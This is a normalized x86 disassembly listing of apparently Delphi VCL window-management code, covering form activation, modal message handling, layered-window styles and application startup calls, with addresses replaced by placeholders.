mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_45aab0
jmp r-xdata
sub_45caad
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_460524
call sub_403a24
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45b800
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4445e4
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4470c4
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cba8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4470c4
call sub_457464
mov ebx eax
sub_45cbf4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_45cc4c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ce4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45ccaa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40321c
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_45ccb8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403418
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45cce4
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_460510
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403418
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_45ce84
jmp r-xdata
mov eax ebx
call sub_45cf20
mov dl 0x1
mov eax ebx
call sub_45aa70
jmp r-xdata
sub_45cd88
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_45a3fc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_45a448
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_45cdec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45ce58
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403418
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45cf20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45cea4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45cf12
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cf19
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_45b6fc
sub_45cf3c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45d204
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_43f104
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_45f3dc
xor edx edx
push ebp
push sub_45d1e7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_41a218
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_45e40c
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_457314
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_45d1c5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_45ce8c
xor edx edx
push ebp
push sub_45d124
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45cdec
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_460290
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_4470c4
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d12b
mov eax [ ebp - 0x4 ]
call sub_45ce84
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_45d12b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d1cf
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45e40c
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_45e40c
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_41a194
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_41a2e0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_4573c8
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45d214
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_443dbc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45d214
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_443d80
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_45d284
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_45d214
pop ecx
mov eax [ esi + 0x34 ]
call sub_4526c4
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_4526d4
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_45d308
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4453dc
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403418
sub_45d32c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403418
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45d35c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_443dbc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45d32c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45d35c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_443d80
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d3d8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45d32c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45d32c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45d35c
pop ecx
test al al
je r-xdata
sub_45d42c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403418
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45d45c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_443dbc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45d42c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45d45c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_443d80
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d4d8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45d42c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45d42c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45d45c
pop ecx
test al al
je r-xdata
sub_45d52c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_41a19c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_44cd0c
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45d580
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_45d52c
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403418
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d5fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_4202cc
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_45d638
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_440d88
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_441a58
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45d680
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4473c8
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_4470c4
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_4470c4
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_4470c4
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_4470c4
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_4470c4
push eax
call RedrawWindow
sub_45d7d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_458584
mov dl 0x5
mov eax ebx
call sub_45a2f8
mov dl 0x1
mov eax ebx
call sub_445c68
mov dl 0x3
mov eax ebx
call sub_45a5f4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_45d83c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45d913
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_445b28
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_445994
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_43fdb8
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_440818
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_40405c
mov eax [ ebp - 0xc ]
call sub_40422c
push eax
mov eax [ ebp - 0xc ]
call sub_40442c
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_440828
mov eax [ ebp - 0xc ]
call sub_40422c
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d91a
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
mov dl 0x1
mov eax esi
call sub_459978
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4408d4
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_4045b8
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45d940
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_443dbc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_45909c
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_443d80
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403418
inc ebp
dec edi
jne r-xdata
sub_45d98c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_445b28
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_45d9b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_446330
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_45d9e0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_45bd48
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4470c4
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_445b28
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4470c4
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4470c4
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_445b3c
or ecx 0xffffffff
mov dl 0x1
call sub_440f4c
pop esi
pop ebx
retn
sub_45da78
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4467a0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_441a58
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_440244
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403418
sub_45dad0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45db96
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_440818
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_40405c
mov eax [ ebp - 0x4 ]
call sub_40422c
push eax
mov eax [ ebp - 0x4 ]
call sub_40442c
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_440828
mov eax [ ebp - 0x4 ]
call sub_40422c
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4408d4
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45db9d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_459978
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4045b8
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45dbbc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_446520
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_445b28
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_445b3c
mov dl [ ebx + 0x57 ]
call sub_4407c4
inc edi
dec esi
jne r-xdata
sub_45dc60
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45dc90
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45dcc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41fb3c
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45e064
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45e070
mov eax ebx
call sub_45e07c
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_45a498
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ce4
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ce4
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ce4
